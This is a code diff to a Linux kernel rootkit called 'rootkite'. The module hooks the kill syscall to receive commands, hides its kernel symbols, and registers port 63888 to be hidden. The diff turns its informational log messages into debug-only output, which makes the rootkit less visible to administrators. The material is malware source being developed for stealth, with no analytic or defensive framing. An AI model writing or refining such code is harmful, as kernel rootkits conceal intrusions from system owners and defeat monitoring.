@@ -38,13 +38,13 @@ static void cleanup(void){
 
 
 static int __init mod_init(void){
-    printk(KERN_INFO "Activated rootkite, Initializing & Hooking Kill\n");
+    pr_debug("Activated rootkite, Initializing & Hooking Kill\n");
     #ifdef PTREGS_SYSCALL_STUB
         pr_info("Running in 64bit mode");
     #endif
     misc_register(&controller); // register the device for interaction within filesystem
     if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
-        printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
+        pr_err("error hooking syscall %d\n", __NR_kill);
     }
     hide_ksyms();
     insert_node(&ports_to_hide, "63888");
@@ -54,7 +54,7 @@ static int __init mod_init(void){
 
 static void __exit mod_exit(void){
     cleanup();
-    printk(KERN_INFO "rootkite: exit\n");
+    pr_debug("rootkite: exit\n");
 }
 
 
